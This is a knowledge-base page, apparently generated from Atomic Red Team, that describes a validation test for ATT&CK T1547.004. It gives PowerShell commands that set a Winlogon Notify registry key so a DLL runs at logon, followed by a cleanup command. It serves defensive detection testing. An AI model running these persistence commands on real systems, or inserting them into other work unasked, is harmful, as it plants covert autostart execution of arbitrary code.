---
atomic_guid: "d40da266-e073-4e5a-bb8b-2b385023e5f9"
title: "Winlogon Notify Key Logon Persistence - PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.004"
attack_technique_name: "Boot or Logon Autostart Execution: Winlogon Helper DLL"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "d40da266-e073-4e5a-bb8b-2b385023e5f9"
  - "Winlogon Notify Key Logon Persistence - PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.

Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.

Please note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution#^t1547004-winlogon-helper-dll|T1547.004: Winlogon Helper DLL]]

## Input Arguments

### binary_to_execute

- description: Path of notification package to execute
- type: path
- default: C:\Windows\Temp\atomicNotificationPackage.dll

### function_to_execute

- description: Function in notification package to execute
- type: string
- default: AtomicTestFunction

## Executor

- name: powershell

### Command

```powershell
New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "#{binary_to_execute}" -Type ExpandString -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "#{function_to_execute}" -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force
```

### Cleanup

```powershell
Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.yaml)
